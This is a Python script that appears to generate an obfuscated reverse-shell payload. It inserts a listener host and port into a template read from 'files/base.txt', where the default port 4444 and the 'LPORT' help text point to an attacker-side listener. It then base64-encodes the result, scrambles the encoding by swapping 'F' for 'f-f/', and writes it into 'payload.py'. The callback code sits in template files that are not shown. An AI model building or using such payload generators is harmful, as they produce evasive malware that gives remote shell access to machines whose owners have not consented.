import base64
import argparse

def make_payload(host,port,file):
	f=open('files/base.txt','r')
	base=f.read()
	f.close()
	f=open('files/payload.txt','r')
	payload=f.read()
	f.close()
	base=base.replace('{host}',host).replace('{port}',str(port))
	base=base64.b64encode(base.encode('utf-8')).decode()
	payload=payload.replace('{base64}',base.replace('F','f-f/'))
	output=open(file,'w+')
	output.write(payload)
	output.close()



def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('--host', required=True, type=str, default=None, help='ip of your machine')
	parser.add_argument('--output', required=False, type=str, default='payload.py', help='output file')
	parser.add_argument('--port', required=False, type=str, default='4444', help='LPORT')
	args = parser.parse_args()
	make_payload(args.host ,args.port ,args.output)

if __name__ == '__main__':
	main()